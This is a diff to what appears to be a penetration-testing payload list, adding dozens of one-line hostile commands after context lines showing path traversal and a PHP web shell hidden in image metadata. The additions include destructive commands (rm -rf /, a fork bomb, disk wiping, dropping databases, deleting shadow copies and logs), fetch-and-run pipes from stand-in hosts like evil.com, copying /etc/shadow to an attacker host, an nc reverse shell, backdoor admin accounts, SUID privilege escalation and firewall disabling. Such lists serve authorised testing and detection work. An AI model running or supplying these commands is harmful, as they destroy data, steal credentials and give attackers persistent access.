@@ -361,3 +361,48 @@ cat /../../../../../../../../../../etc/shadow
 convert -size 110x110 xc:white payload.jpg
 exiftool -Copyright="PayloadsAllTheThings" -Artist="Pentest" -ImageUniqueID="Example" payload.jpg
 exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
+rm -rf /
+del /s /q C:\Windows\System32
+:(){ :|:& };:
+shutdown -s -f -t 0
+format C: /fs:NTFS /q /y
+dd if=/dev/zero of=/dev/sda bs=512 count=1
+wget http://malicious-site.com/backdoor.sh -O- | sh
+curl http://badguy.com/m.sh | bash
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest..."
+sqlplus system/manager@XE @drop_all.sql
+mysql -e "DROP DATABASE employees;"
+psql -U postgres -c "DELETE FROM users WHERE 1=1;"
+sqlite3 my.db "DROP TABLE credentials;"
+reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /f
+taskkill /IM explorer.exe /F
+useradd -u 0 attacker
+echo 'malicious code' > /etc/bash.bashrc
+crontab -e
+python3 -m http.server 80 &
+scp /etc/shadow attacker@evil.com:/tmp/
+nc -e /bin/sh attacker.com 4444
+net user hacker Pass1234! /add
+net localgroup administrators hacker /add
+icacls C:\Windows\System32 /grant hacker:F
+rundll32.exe shell32.dll,SHExitWindowsEx 1
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+cp shell.php /var/www/html/
+mv /bin/bash /tmp/
+chmod +s /tmp/bash
+/tmp/bash -p
+alias ls='rm -rf *'
+find / -exec rm -rf {} \;
+killall -9 sshd
+pkill -f nginx
+iptables -F
+ufw disable
+nmcli networking off
+netsh firewall set opmode disable
+vssadmin delete shadows /all /quiet
+wevtutil cl System
+bcdedit /set {current} safeboot minimal
+echo "DROP DATABASE prod;" | mysql -u root -p
+wget -q -O- http://evil.com/script.sh | bash
+powershell.exe -ExecutionPolicy Bypass -File evil.ps1
+mshta http://attacker.com/malware.hta
